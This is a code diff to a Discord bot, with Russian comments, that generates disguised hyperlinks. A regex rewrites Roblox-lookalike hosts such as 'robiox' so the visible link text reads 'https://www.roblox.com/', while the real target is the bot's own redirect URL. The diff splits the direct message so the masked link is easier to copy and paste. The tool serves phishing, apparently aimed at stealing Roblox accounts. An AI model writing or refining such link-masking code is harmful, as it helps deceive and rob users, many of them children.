@@ -1,5 +1,5 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
 const express = require('express');
 const app = express();
 
@@ -48,28 +48,28 @@ client.on('interactionCreate', async (interaction) => {
         const shortUrl = `${process.env.BASE_URL}/r/${id}`;
         const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');
 
-        // 1. Ответ в канал (как раньше)
+        // 1. Ответ в канал со смайликом
         await interaction.reply({ 
-            content: `Check your DMs!`, 
+            content: `<a:verify:1513286049638518824> Check your DMs!`, 
             flags: [MessageFlags.Ephemeral] 
         });
 
-        // 2. Формируем Embed с вашим цветом 0x274666
-        const embed = {
-            color: 0x274666,
-            title: '🔗 Hyperlink Generated',
-            description: 'Your link is ready! Click on the code block below to copy it',
-            fields: [
-                {
-                    name: 'Link',
-                    value: `\`[${visualUrl}](${shortUrl})\``
-                }
-            ]
-        };
-
-        // 3. Отправляем в ЛС
+        // 2. Отправляем в ЛС двумя сообщениями
         try {
-            await interaction.user.send({ embeds: [embed] });
+            // Первое: Embed с заголовком
+            await interaction.user.send({ 
+                embeds: [{
+                    color: 0x274666,
+                    title: '🔗 Hyperlink Generated',
+                    description: 'Your link is ready! Click on the code block below to copy it'
+                }]
+            });
+
+            // Второе: Сама ссылка
+            await interaction.user.send({ 
+                content: `\`[${visualUrl}](${shortUrl})\`` 
+            });
+
         } catch (error) {
             console.error('Не удалось отправить ЛС:', error);
             await interaction.followUp({ 
